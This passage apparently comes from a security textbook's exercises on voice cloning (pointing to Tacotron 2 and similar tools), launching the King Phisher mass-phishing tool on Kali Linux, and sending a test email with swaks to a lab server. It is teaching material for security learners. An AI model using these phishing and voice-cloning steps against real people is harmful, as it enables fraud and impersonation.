		<p class="indent">Tacotron 2 requires only five seconds of audio to mimic someone’s voice. Although Google hasn’t released its implementation of Tacotron 2, other developers have created the system described in Google’s paper introducing the concept. You can find a link to one implementation at <em><a href="https://github.com/Rayhane-mamah/Tacotron-2">https://github.com/Rayhane-mamah/Tacotron-2</a></em>.</p>
		<p class="indent">Setting up this system can be a daunting task. Not to worry: you can always try other, more accessible implementations of earlier voice cloning systems, such as those at <em><a href="https://github.com/CorentinJ/Real-Time-Voice-Cloning">https://github.com/CorentinJ/Real-Time-Voice-Cloning</a></em>. <span epub:type="pagebreak" id="page_128"/>Try generating a voice clone of a famous person. And if you don’t feel like coding, there are commercial tools like Descript <em><a href="https://www.descript.com/">https://www.descript.com/</a></em> that allow you to clone your own voice with only a few mouse clicks.</p>
		<h4 class="h4" id="ch07lev13"><strong><em>Phishing at Scale</em></strong></h4>
		<p class="noindent">King Phisher is a mass phishing tool that comes with Kali Linux. You can use this exercise as an opportunity to familiarize yourself with the tool and its capabilities. Start the necessary background services by running the following commands:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">sudo service postgresql start</span><br/>kali@kali:~$ <span class="codestrong1">sudo service king-phisher start</span></p>
		<p class="indent">Then, start the King Phisher application by searching for it in the <strong>Kali Application</strong> menu (<a href="ch07.xhtml#ch7fig7">Figure 7-7</a>). It takes a couple seconds to launch the application.</p>
		<div class="image" id="ch7fig7">
			<img alt="image" src="../images/ch07fig07.jpg"/>
		</div>
		<p class="figcap"><em>Figure 7-7: The King Phisher interface</em></p>
		<p class="indent">After King Phisher has launched, you can log in using your Kali Linux machine’s username and password because the server is hosted locally. Now have fun creating a new phishing campaign. Remember to act ethically!</p>
		<h4 class="h4" id="ch07lev14"><span epub:type="pagebreak" id="page_129"/><strong><em>SMTP Auditing</em></strong></h4>
		<p class="noindent">Another great tool for testing the security of an SMTP server is <span class="literal">swaks</span>, and it comes preinstalled in Kali Linux. You can deliver a test email with a single command:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">swaks --to sys --server <span class="codeitalic">&lt;Metasploitable IP address&gt;</span></span></p>
		<p class="indent">The following is a snippet of the results of running the command:</p>
		<p class="programs">=== Trying 192.168.1.101:25...<br/>
=== Connected to 192.168.1.101.<br/>
&lt;-  220 metasploitable.localdomain ESMTP Postfix (Ubuntu)<br/>
 -&gt; EHLO kali<br/>
&lt;-  250-metasploitable.localdomain<br/>
             ...<br/>
&lt;-  250 2.1.5 Ok<br/>
 -&gt; DATA<br/>
&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br/>
 -&gt; Date: Fri, 13 May 2022 15:46:17 -0500<br/>
 -&gt; To: sys<br/>
 -&gt; From: kali@kali<br/>
 -&gt; Subject: test Fri, 13 May 2022 15:46:17 -0500<br/>
 -&gt; Message-Id: &lt;20201113154617.001295@kali&gt;<br/>
 -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/<br/>
 -&gt;<br/>
 -&gt; This is a test mailing<br/>
             ...<br/>
 -&gt;.<br/>
&lt;-  250 2.0.0 Ok: queued as BADADCBFC<br/>
 -&gt; QUIT<br/>
&lt;-  221 2.0.0 Bye<br/>
=== Connection closed with remote host.</p>
		<p class="indent">You can view all the amazing things that <span class="literal">swaks</span> can do by running the following:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">swaks --help</span><span epub:type="pagebreak" id="page_130"/></p>
	</body>
</html>